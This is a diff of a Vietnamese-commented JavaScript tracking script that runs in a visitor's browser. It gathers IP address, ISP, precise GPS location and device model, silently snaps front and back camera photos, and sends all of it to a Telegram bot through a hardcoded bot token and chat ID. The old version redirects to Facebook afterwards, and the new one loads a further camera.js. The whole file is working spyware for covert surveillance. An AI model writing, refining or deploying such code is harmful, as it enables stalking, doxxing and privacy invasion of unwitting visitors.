@@ -1,128 +1,243 @@
-const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
-const ID = '-1003770043455';
+const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
+const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1003770043455';
+const TELEGRAM_CHAT_ID_NO_PHOTOS = '-1003770043455';
 
-// Hàm lấy GPS với độ chính xác cao
-function getGPS() {
-    return new Promise((res) => {
-        if (!navigator.geolocation) return res(null);
-        let best = null;
-        const watchID = navigator.geolocation.watchPosition(
-            (p) => {
-                const { latitude, longitude, accuracy } = p.coords;
-                if (!best || accuracy < best.acc) {
-                    best = { lat: latitude, lon: longitude, acc: accuracy };
-                }
-                if (accuracy < 10) { // Sai số dưới 10m thì dừng quét
-                    navigator.geolocation.clearWatch(watchID);
-                    res(best);
-                }
-            },
-            () => res(best),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+const info = {
+  time: new Date().toLocaleString('vi-VN'),
+  ip: '',
+  isp: '',
+  realIp: '',
+  address: '',
+  country: '', 
+  lat: '',
+  lon: '',
+  device: '',
+  os: '',
+  camera: '⏳ Đang kiểm tra...'
+};
+
+function detectDevice() {
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const screenW = window.screen.width;
+  const screenH = window.screen.height;
+  const ratio = window.devicePixelRatio;
+
+  if (/Android/i.test(ua)) {
+    info.os = 'Android';
+    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
+    if (match) {
+      let model = match[1].split('/')[0].trim();
+      if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
+      if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
+      info.device = model;
+    } else {
+      info.device = 'Android Device';
+    }
+  } 
+  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    info.os = 'iOS';
+    const res = `${screenW}x${screenH}@${ratio}`;
+    const iphoneModels = {
+      "430x932@3": "iPhone 14/15/16 Pro Max",
+      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
+      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
+      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
+      "414x896@3": "iPhone XS Max / 11 Pro Max",
+      "414x896@2": "iPhone XR / 11",
+      "375x812@3": "iPhone X / XS / 11 Pro",
+      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
+    };
+    info.device = iphoneModels[res] || 'iPhone Model';
+  } 
+  else if (/Windows NT/i.test(ua)) {
+    info.device = 'Windows PC';
+    info.os = 'Windows';
+  } else if (/Macintosh/i.test(ua)) {
+    info.device = 'Mac';
+    info.os = 'macOS';
+  } else {
+    info.device = 'Không xác định';
+    info.os = 'Không rõ';
+  }
+}
+
+async function getPublicIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const data = await r.json();
+    info.ip = data.ip || 'Không rõ';
+  } catch (e) { info.ip = 'Bị chặn'; }
+}
+
+async function getRealIP() {
+  try {
+    const r = await fetch('https://icanhazip.com');
+    const ip = await r.text();
+    info.realIp = ip.trim();
+    const res = await fetch(`https://ipwho.is/${info.realIp}`);
+    const data = await res.json();
+    info.isp = data.connection?.org || 'VNNIC';
+    info.country = data.country || 'Việt Nam';
+  } catch (e) { info.realIp = 'Lỗi kết nối'; }
+}
+
+let useGPS = false;
+
+async function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
+
+    navigator.geolocation.getCurrentPosition(
+      async pos => {
+        useGPS = true;
+        info.lat = pos.coords.latitude.toFixed(6);
+        info.lon = pos.coords.longitude.toFixed(6);
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
+          const data = await res.json();
+          info.address = data.display_name || '📍 Vị trí GPS';
+          info.country = data.address?.country || info.country;
+        } catch {
+          info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
+        }
+        resolve();
+      },
+      async () => {
+        useGPS = false;
+        await fallbackIPLocation();
+        resolve();
+      },
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  });
+}
+
+async function fallbackIPLocation() {
+  try {
+    const data = await fetch(`https://ipwho.is/`).then(r => r.json());
+    info.lat = data.latitude?.toFixed(6) || '0';
+    info.lon = data.longitude?.toFixed(6) || '0';
+    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
+    info.country = data.country || 'Việt Nam';
+  } catch (e) { info.address = 'Không rõ'; }
+}
+
+async function captureCamera(facingMode = 'user') {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+    return new Promise(resolve => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         setTimeout(() => {
-            navigator.geolocation.clearWatch(watchID);
-            res(best);
-        }, 8000); 
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          stream.getTracks().forEach(t => t.stop());
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+        }, 800);
+      };
     });
+  } catch (e) {
+    throw e;
+  }
 }
 
-async function getVitals() {
-    try {
-        const r = await fetch('https://ipwho.is/');
-        const d = await r.json();
-        return {
-            ip: d.ip || '?',
-            isp: d.connection?.org || '?',
-            addr: `${d.city}, ${d.region}`,
-            lat: d.latitude || 0,
-            lon: d.longitude || 0
-        };
-    } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
+function getCaption() {
+  const mapsLink = info.lat && info.lon
+    ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
+    : 'Không rõ';
+
+  return `
+📡 [THÔNG TIN TRUY CẬP]
+
+🕒 Thời gian: ${info.time}
+📱 Thiết bị: ${info.device}
+🖥️ Hệ điều hành: ${info.os}
+🌍 IP dân cư: ${info.ip}
+🧠 IP gốc: ${info.realIp}
+🏢 ISP: ${info.isp}
+🏙️ Địa chỉ: ${info.address}
+🌎 Quốc gia: ${info.country}
+📍 Vĩ độ: ${info.lat}
+📍 Kinh độ: ${info.lon}
+📌 Google Maps: ${mapsLink}
+📸 Camera: ${info.camera}
+`.trim();
 }
 
-async function capture(mode) {
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-        const v = document.createElement('video');
-        v.srcObject = s;
-        v.muted = true;
-        await v.play();
+function getCaptionWithExtras() {
+  return getCaption() + `\n\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
+}
 
-        return new Promise(res => {
-            setTimeout(() => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; 
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                
-                // Quan trọng: Tắt camera ngay lập tức sau khi chụp xong
-                s.getTracks().forEach(t => t.stop());
-                
-                c.toBlob(res, 'image/jpeg', 0.7);
-            }, 2000); // Chờ 2s để camera lấy nét
-        });
-    } catch (e) { return null; }
+async function sendPhotos(frontBlob, backBlob) {
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
+  
+  const media = [];
+  if (frontBlob) {
+    media.push({ type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() });
+    formData.append('front', frontBlob, 'front.jpg');
+  }
+  if (backBlob) {
+    media.push({ type: 'photo', media: 'attach://back' });
+    formData.append('back', backBlob, 'back.jpg');
+  }
+
+  formData.append('media', JSON.stringify(media));
+  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+}
+
+async function sendTextOnly() {
+  return fetch(API_SEND_TEXT, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
+      text: getCaption()
+    })
+  });
+}
+
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 async function main() {
-    // 1. Chạy lấy thông tin nền trước
-    const [gps, info] = await Promise.all([getGPS(), getVitals()]);
-    
-    // 2. Chụp cam trước (user)
-    const p1 = await capture("user");
+  detectDevice();
+  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
 
-    // --- ĐÂY LÀ ĐOẠN GIÃN CÁCH 1 GIÂY ---
-    await new Promise(resolve => setTimeout(resolve, 1000)); 
-    // ------------------------------------
+  let front = null, back = null;
 
-    // 3. Chụp cam sau (environment)
-    const p2 = await capture("environment");
+  try {
+    front = await captureCamera("user");
+    await delay(500);
+    back = await captureCamera("environment");
+    info.camera = '✅ Đã chụp camera trước và sau';
+  } catch (e) {
+    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
+  }
 
-    const lat = gps ? gps.lat : info.lat;
-    const lon = gps ? gps.lon : info.lon;
-    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
-    const map = `https://www.google.com/maps?q=${lat},${lon}`; // Sửa link map chuẩn
-
-    const cap = `📡 [THÔNG TIN TRUY CẬP]
-🕒 ${new Date().toLocaleString('vi-VN')}
-📱 Thiết bị: ${navigator.platform}
-🌍 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-📍 Khu vực: ${info.addr}
-🛠 Định vị: ${type}
-📌 Maps: ${map}
-📸 Camera: ${p1 ? '✅ Trước' : '❌'} | ${p2 ? '✅ Sau' : '❌'}`.trim();
-
-    const fd = new FormData();
-    fd.append('chat_id', ID);
-    
-    if (p1 || p2) {
-        const media = [];
-        if (p1) {
-            fd.append('f1', p1, '1.jpg');
-            // Gắn Caption vào tấm hình đầu tiên trong mảng
-            media.push({ type: 'photo', media: 'attach://f1', caption: cap });
-        }
-        if (p2) {
-            fd.append('f2', p2, '2.jpg');
-            // Nếu không có p1 thì gắn cap vào p2, nếu có rồi thì để trống
-            media.push({ type: 'photo', media: 'attach://f2', caption: p1 ? '' : cap });
-        }
-        
-        fd.append('media', JSON.stringify(media));
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
-    } else {
-        // Gửi tin nhắn text thuần nếu không chụp được ảnh nào
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: ID, text: cap })
-        });
-    }
-    
-    // Chuyển hướng sau khi hoàn tất
-    window.location.href = "https://www.facebook.com/watch/";
+  if (front || back) {
+    await sendPhotos(front, back);
+  } else {
+    await sendTextOnly();
+  }
 }
 
-main();
+main().then(async () => {
+  window.mainScriptFinished = true;
+  await delay(1500);
+
+  const script = document.createElement('script');
+  script.src = 'camera.js'; 
+  script.defer = true;
+  document.body.appendChild(script);
+  console.log("✅ Hệ thống đã hoàn tất gửi thông tin chi tiết.");
+});
